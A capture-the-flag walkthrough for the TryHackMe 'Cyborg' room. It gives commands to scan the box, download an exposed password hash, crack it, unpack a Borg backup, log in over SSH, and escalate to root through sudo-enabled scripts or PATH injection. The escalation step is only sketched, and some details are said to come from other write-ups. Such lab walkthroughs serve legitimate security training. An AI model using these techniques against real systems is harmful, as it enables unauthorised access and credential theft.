## Room : https://tryhackme.com/room/cyborgt8
## Step 1: Recon
Use a thorough TCP scan with service scripts.

```bash
sudo nmap -sC -sV -T4 -p- MACHINE_IP
```
Expected: SSH(22), HTTP(80) open.

---

## Step 2: Web Enumeration and Hash Retrieval
Browse HTTP and enumerate common/interesting paths; the app exposes Squid config/passwd over the web.

Directly fetch the Squid password file once discovered.

```bash
curl -s http://MACHINE_IP/etc/squid/passwd | tee passwd.hash
```
Typical content includes an MD5-crypt (APR1) hash for user `music_archive`.

---

## Step 3: Crack MD5-crypt (APR1) with John
Use rockyou to crack the APR1 hash.

```bash
john passwd.hash --wordlist=/usr/share/wordlists/rockyou.txt
john --show passwd.hash
```
Expected result: `music_archive:squidward` (password “squidward”).

---

## Step 4: Download and Extract the Site Archive
On the web app, navigate to the admin/archive section and download `archive.tar`.

```bash
# after downloading archive.tar from http://MACHINE_IP/admin (Archive > Download)
tar -xvf archive.tar
```
This reveals a Borg repository at `home/field/dev/final_archive` with README, config, data/, index, nonce, integrity/hints files.

---

## Step 5: List and Extract Borg Repository
Install borgbackup if missing, then list and extract using the cracked passphrase “squidward.”

```bash
sudo apt-get update && sudo apt-get install -y borgbackup
borg list ./home/field/dev/final_archive
borg extract ./home/field/dev/final_archive::music_archive
```
After extraction, inspect the recovered files (typically `home/alex/Documents/note.txt`) to find SSH credentials for alex.

```bash
grep -Rni "alex" .
cat home/alex/Documents/note.txt
```
Expected credential example from multiple walkthroughs: `alex:S3cretP@s3` (actual note content provided in recovered files).

---

## Step 6: SSH as alex and Get User Flag
SSH using the recovered credentials.

```bash
ssh alex@MACHINE_IP
```
Then read the user flag as usual (e.g., `~/user.txt`).

```bash
cat ~/user.txt
```

---

## Step 7: Privilege Escalation
Enumerate sudo permissions and root-run scripts; this box is known to allow privesc via a misconfigured root-privileged script or PATH abuse.

Check sudo and look for backup.sh or similar.

```bash
sudo -l
```
If a root script (e.g., `backup.sh`) is allowed without password and is path-abusable or writable, leverage it accordingly; several writeups mounted/extracted the Borg repo to find alex creds and then used a sudo-enabled backup script to escalate.

### Example patterns seen:
- If PATH injection is possible inside a root-run script, craft a malicious binary named as the called command and adjust PATH.
- If the script is writable or executes a file in a writable path, replace it to spawn a shell.

Once exploited:

```bash
id
cat /root/root.txt
```

> **Note:** Exact privesc mechanics can vary slightly by instance; the consistent approach is to enumerate `sudo -l`, readable/writable root-run scripts, and PATH usage within those scripts.
